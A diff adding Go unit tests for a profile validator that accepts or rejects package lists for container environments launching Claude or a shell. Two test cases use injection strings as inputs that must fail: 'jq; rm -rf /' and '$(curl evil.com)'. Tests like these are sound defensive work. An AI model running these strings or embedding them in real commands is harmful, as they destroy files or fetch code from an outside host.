@@ -274,6 +274,66 @@ func TestValidate(t *testing.T) {
 			wantErr: "mount_container_sock is only valid with environment: container",
 		},
 		{
+			name: "valid container with packages",
+			profile: Profile{
+				Environment: EnvironmentContainer,
+				Launch:      LaunchClaude,
+				Packages:    []string{"jq", "tree"},
+			},
+		},
+		{
+			name: "packages with host environment",
+			profile: Profile{
+				Environment: EnvironmentHost,
+				Launch:      LaunchShell,
+				Packages:    []string{"jq"},
+			},
+			wantErr: "packages is only valid with environment: container",
+		},
+		{
+			name: "invalid package name with semicolon",
+			profile: Profile{
+				Environment: EnvironmentContainer,
+				Launch:      LaunchClaude,
+				Packages:    []string{"jq; rm -rf /"},
+			},
+			wantErr: "invalid package name",
+		},
+		{
+			name: "invalid package name with shell expansion",
+			profile: Profile{
+				Environment: EnvironmentContainer,
+				Launch:      LaunchClaude,
+				Packages:    []string{"$(curl evil.com)"},
+			},
+			wantErr: "invalid package name",
+		},
+		{
+			name: "invalid package name with spaces",
+			profile: Profile{
+				Environment: EnvironmentContainer,
+				Launch:      LaunchClaude,
+				Packages:    []string{"jq tree"},
+			},
+			wantErr: "invalid package name",
+		},
+		{
+			name: "valid package with version specifier",
+			profile: Profile{
+				Environment: EnvironmentContainer,
+				Launch:      LaunchClaude,
+				Packages:    []string{"python3-pip", "libssl-dev", "gcc-12"},
+			},
+		},
+		{
+			name: "valid RPM package with underscore",
+			profile: Profile{
+				Environment: EnvironmentContainer,
+				Launch:      LaunchClaude,
+				Packages:    []string{"mod_ssl", "python3_devel"},
+			},
+		},
+		{
 			name: "valid auth config",
 			profile: Profile{
 				Environment: EnvironmentContainer,
